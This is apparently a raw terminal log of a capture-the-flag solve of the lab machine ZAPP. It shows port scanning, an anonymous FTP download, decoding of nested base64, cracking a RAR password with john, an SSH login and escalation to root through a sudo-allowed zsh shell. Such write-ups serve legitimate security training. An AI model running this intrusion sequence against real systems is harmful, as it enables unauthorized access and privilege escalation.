┌──(kali㉿kali)-[~/Documents/zapp]
└─$ nmap -sS -p- --open --min-rate 5000 -n -Pn 192.168.56.111 -oN scan.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 19:19 EST
Nmap scan report for 192.168.56.111
Host is up (0.00013s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:D7:AA:E2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.20 seconds
                                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Documents/zapp]
└─$ grep '^[0-9]' scan.txt | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','


21,22,80
                                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Documents/zapp]


┌──(kali㉿kali)-[~/Documents/zapp]
└─$ nmap -sCV -p21,22,80 -vvv -n -Pn 192.168.56.111 -oN fullscan.txt
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 19:20 EST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
Initiating ARP Ping Scan at 19:20
Scanning 192.168.56.111 [1 port]
Completed ARP Ping Scan at 19:20, 0.12s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:20
Scanning 192.168.56.111 [3 ports]
Discovered open port 21/tcp on 192.168.56.111
Discovered open port 80/tcp on 192.168.56.111
Discovered open port 22/tcp on 192.168.56.111
Completed SYN Stealth Scan at 19:20, 0.05s elapsed (3 total ports)
Initiating Service scan at 19:20
Scanning 3 services on 192.168.56.111
Completed Service scan at 19:20, 11.04s elapsed (3 services on 1 host)
NSE: Script scanning 192.168.56.111.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:20
NSE: [ftp-bounce 192.168.56.111:21] PORT response: 500 Illegal PORT command.
Completed NSE at 19:20, 0.58s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.05s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
Nmap scan report for 192.168.56.111
Host is up, received arp-response (0.00053s latency).
Scanned at 2025-11-02 19:20:08 EST for 12s

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              28 Oct 29 20:59 login.txt
|_-rw-r--r--    1 0        0              65 Oct 29 21:23 secret.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)
| ssh-hostkey: 
|   3072 a3:23:b3:aa:df:c6:51:cb:a2:0c:92:8e:6b:fe:96:ee (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+S08UpCAAkfkyQOXYhnapAf8NrUa2NloM2dzeUSjsTixJ7qJM3FhoHN/5rvBJb98svP7Rs8V4x6A2axiiD64mUsfNTX6GC5JemJIWole/yyW4Uulo0rKaHdCvHOgOlWFphHtU+ZklG5sIqtJRHaZy5xiXZnVy2OalnBv0Exvby2h6ARvMlQys020yZAVYVXh2Dp0Kk2XHrDNljvQPikGjo6deC8gUENqGSHlYKax6FFK8+6qTcMYDzkcQJVo9+I/6u+EE9EiPk+hm/mVh9x3Cd/F01GcRp5QHGkHma3vKE7vEIlDTZS0Ha5PJYFAq8AjvZHdbKcBcONlja8jQ1gwTu+nrtmpOsM2uaAYslH4i5D6OedWEVLktNELBbC+AywdWcHzvHw1mQdjZCNYHY3o+w8V3PV8u9wiH4JVf4GFYjKWwQ++6flQnUcpXtMGfn1y0fY6AU9FZXUQaRHKNV8rf7K1eWoNnauf7QO7to84KOtotjAa5vQvjR18i5AQd8a8=
|   256 fd:95:2f:2f:7f:5a:21:b5:0e:75:2c:da:18:c9:52:35 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJIzG68W0Lc1RVYcz4gQi1bKaj/Ur/r63yiySE/FV55MYADfcgmo5LQa4m5LnHzBWRdkN5RLwqqXqSXZSkzd56E=
|   256 a1:0e:0d:79:8e:54:3e:0e:ed:2f:96:d6:d3:9a:9f:a6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINS0D9TRt7d/C319AC8Q7AILAzjw1jn0a64IticO1vDt
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.65 ((Debian))
|_http-title: zappskred - CTF Challenge
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.65 (Debian)
MAC Address: 08:00:27:D7:AA:E2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.50 seconds
           Raw packets sent: 4 (160B) | Rcvd: 4 (160B)
                                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Documents/zapp]
└─$ ftp 192.168.56.111 
Connected to 192.168.56.111.
220 Welcome zappskred.
Name (192.168.56.111:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||51067|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              28 Oct 29 20:59 login.txt
-rw-r--r--    1 0        0              65 Oct 29 21:23 secret.txt
226 Directory send OK.
ftp> get login.txt
local: login.txt remote: login.txt
229 Entering Extended Passive Mode (|||46361|)
150 Opening BINARY mode data connection for login.txt (28 bytes).
100% |**************************************************************************************************************************************************************************************************************|    28       12.76 KiB/s    00:00 ETA
226 Transfer complete.
28 bytes received in 00:00 (10.44 KiB/s)
ftp> get secret.txt
local: secret.txt remote: secret.txt
229 Entering Extended Passive Mode (|||17959|)
150 Opening BINARY mode data connection for secret.txt (65 bytes).
100% |**************************************************************************************************************************************************************************************************************|    65        6.30 KiB/s    00:00 ETA
226 Transfer complete.
65 bytes received in 00:00 (5.52 KiB/s)
ftp> 
ftp> exit















┌──(kali㉿kali)-[~/Documents/Go-Hash]
└─$ echo 'VjFST1YyRkhVa2xUYmxwYVRURmFiMXBGYUV0a2JWSjBWbTF3WVZkRk1VeERaejA5Q2c9PQo=' | base64 
VmpGU1QxWXlSa2hWYTJ4VVlteHdZVlJVUm1GaU1YQkdZVVYwYTJKV1NqQldiVEYzV1Zaa1JrMVZl
RVJhZWpBNVEyYzlQUW89Cg==
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Go-Hash]
└─$ echo 'VjFST1YyRkhVa2xUYmxwYVRURmFiMXBGYUV0a2JWSjBWbTF3WVZkRk1VeERaejA5Q2c9PQo=' | base64 -d
V1ROV2FHUklTblpaTTFab1pFaEtkbVJ0Vm1wYVdFMUxDZz09Cg==
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Go-Hash]
└─$ echo 'V1ROV2FHUklTblpaTTFab1pFaEtkbVJ0Vm1wYVdFMUxDZz09Cg==' | base64 -d
WTNWaGRISnZZM1ZoZEhKdmRtVmpaWE1LCg==
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Go-Hash]
└─$ echo 'WTNWaGRISnZZM1ZoZEhKdmRtVmpaWE1LCg==' | base64 -d
Y3VhdHJvY3VhdHJvdmVjZXMK
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Go-Hash]
└─$ echo 'Y3VhdHJvY3VhdHJvdmVjZXMK' | base64 -d            
cuatrocuatroveces
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Go-Hash]
└─$ 





┌──(kali㉿kali)-[~/Documents/zapp]
└─$ ls
fullscan.txt  login.txt  scan.txt  secret.txt
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/zapp]
└─$ ls
fullscan.txt  login.txt  scan.txt  secret.txt  Sup3rP4ss.rar
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/zapp]
└─$ rar2john Sup3rP4ss.rar > hash.txt
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/zapp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (RAR5 [PBKDF2-SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
reema            (Sup3rP4ss.rar)     
1g 0:00:01:47 DONE (2025-11-02 19:44) 0.009335g/s 788.6p/s 788.6c/s 788.6C/s reveal..precious5
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/zapp]
└─$ unrar e Sup3rP4ss.rar 

UNRAR 7.11 freeware      Copyright (c) 1993-2025 Alexander Roshal


Extracting from Sup3rP4ss.rar

Enter password (will not be echoed) for Sup3rP4ss.txt: reema

Extracting  Sup3rP4ss.txt                                             OK 
All OK
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/zapp]
└─$ ls
fullscan.txt  hash.txt  login.txt  scan.txt  secret.txt  Sup3rP4ss.rar  Sup3rP4ss.txt
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/zapp]
└─$ cat Sup3rP4ss.txt 
Intenta probar con más >> 3spuM4                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Documents/zapp]
└─$ 






┌──(kali㉿kali)-[~/Documents/zapp]
└─$ ssh zappskred@192.168.56.111                             
    ███████╗ █████╗ ██████╗ ██████╗ 
 ╚══███╔╝██╔══██╗██╔══██╗██╔══██╗
   ███╔╝ ███████║██████╔╝██████╔╝
  ███╔╝  ██╔══██║██╔═══╝ ██╔═══╝ 
 ███████╗██║  ██║██║     ██║     
 ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝     


zappskred@192.168.56.111's password: 3spuM4
Linux TheHackersLabs-ZAPP 5.10.0-36-amd64 #1 SMP Debian 5.10.244-1 (2025-09-29) x86_64

Last login: Sat Nov  1 03:15:28 2025 from 192.168.18.16
ZAPP
+)Creador: puerto4444
+)Nombre: ZAPP
+)IP: 192.168.56.111
----------------------------------------
zappskred@TheHackersLabs-ZAPP:~$ whoami
zappskred
zappskred@TheHackersLabs-ZAPP:~$ ls -la
total 32
drwxr-xr-x 3 zappskred zappskred 4096 Oct 30 03:16 .
drwxr-xr-x 3 root      root      4096 Oct 29 17:34 ..
-rw------- 1 zappskred zappskred 1485 Oct 30 17:16 .bash_history
-rw-r--r-- 1 zappskred zappskred  220 Oct 29 17:34 .bash_logout
-rw-r--r-- 1 zappskred zappskred 3704 Oct 30 03:16 .bashrc
drwxr-xr-x 3 zappskred zappskred 4096 Oct 30 03:15 .local
-rw-r--r-- 1 zappskred zappskred  807 Oct 29 17:34 .profile
-rw-r--r-- 1 zappskred zappskred   21 Oct 29 23:17 user.txt
zappskred@TheHackersLabs-ZAPP:~$ 






zappskred@TheHackersLabs-ZAPP:~$ whoami
zappskred
zappskred@TheHackersLabs-ZAPP:~$ ls -la
total 32
drwxr-xr-x 3 zappskred zappskred 4096 Oct 30 03:16 .
drwxr-xr-x 3 root      root      4096 Oct 29 17:34 ..
-rw------- 1 zappskred zappskred 1485 Oct 30 17:16 .bash_history
-rw-r--r-- 1 zappskred zappskred  220 Oct 29 17:34 .bash_logout
-rw-r--r-- 1 zappskred zappskred 3704 Oct 30 03:16 .bashrc
drwxr-xr-x 3 zappskred zappskred 4096 Oct 30 03:15 .local
-rw-r--r-- 1 zappskred zappskred  807 Oct 29 17:34 .profile
-rw-r--r-- 1 zappskred zappskred   21 Oct 29 23:17 user.txt
zappskred@TheHackersLabs-ZAPP:~$ cat user.txt 
ZWwgbWVqb3IgY2FmZQo=
zappskred@TheHackersLabs-ZAPP:~$ 
zappskred@TheHackersLabs-ZAPP:~$ 
zappskred@TheHackersLabs-ZAPP:~$ 




zappskred@TheHackersLabs-ZAPP:~$ sudo -l
sudo: unable to resolve host TheHackersLabs-ZAPP: Temporary failure in name resolution
[sudo] password for zappskred: 
Matching Defaults entries for zappskred on TheHackersLabs-ZAPP:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zappskred may run the following commands on TheHackersLabs-ZAPP:
    (root) /bin/zsh
zappskred@TheHackersLabs-ZAPP:~$ sudo /bin/zsh
sudo: unable to resolve host TheHackersLabs-ZAPP: Temporary failure in name resolution
TheHackersLabs-ZAPP# whoami
root
TheHackersLabs-ZAPP# 
TheHackersLabs-ZAPP# cd /root 
TheHackersLabs-ZAPP# ls
root.txt
TheHackersLabs-ZAPP# cat root.txt 
c2llbXByZSBlcyBudWVzdHJvCg==
TheHackersLabs-ZAPP# 
TheHackersLabs-ZAPP# 

